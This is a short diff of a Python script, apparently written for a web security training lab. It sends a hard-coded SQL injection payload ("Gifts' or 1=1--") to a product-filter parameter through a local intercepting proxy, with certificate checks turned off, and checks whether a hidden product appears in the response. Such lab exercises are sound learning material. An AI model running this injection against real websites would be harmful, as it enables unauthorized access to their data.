@@ -6,7 +6,7 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
-#Setting up the proxy
+#Making requests go through the proxy
 proxy = {'http': 'http://127.0.0.1:8080', 'https' : "http://127.0.0.1:8080"}
 
 #Exploit Function
@@ -14,7 +14,7 @@ def exploit_executed(url, payload):
     uri = "/filter?category="
     request = requests.get(url + uri + payload, verify=False, proxies=proxy)
     #An item that only exists if exploit was successful
-    if "Babbage Web Spray" in request.text:
+    if "Adult Space Hopper" in request.text:
         return True
     else:
         return False
@@ -24,10 +24,10 @@ if __name__ == "__main__":
     #Insuring correct syntax
     try:
         url = sys.argv[1].strip()
-        payload = sys.argv[2].strip()
+        payload = "Gifts' or 1=1--"
 
     except IndexError:
-        print(f"[-] Usage: {sys.argv[0]} <url> <payload>")
+        print(f"[-] Usage: {sys.argv[0]} <url>")
         sys.exit(-1)
 
     #Checking if the exploit worked 
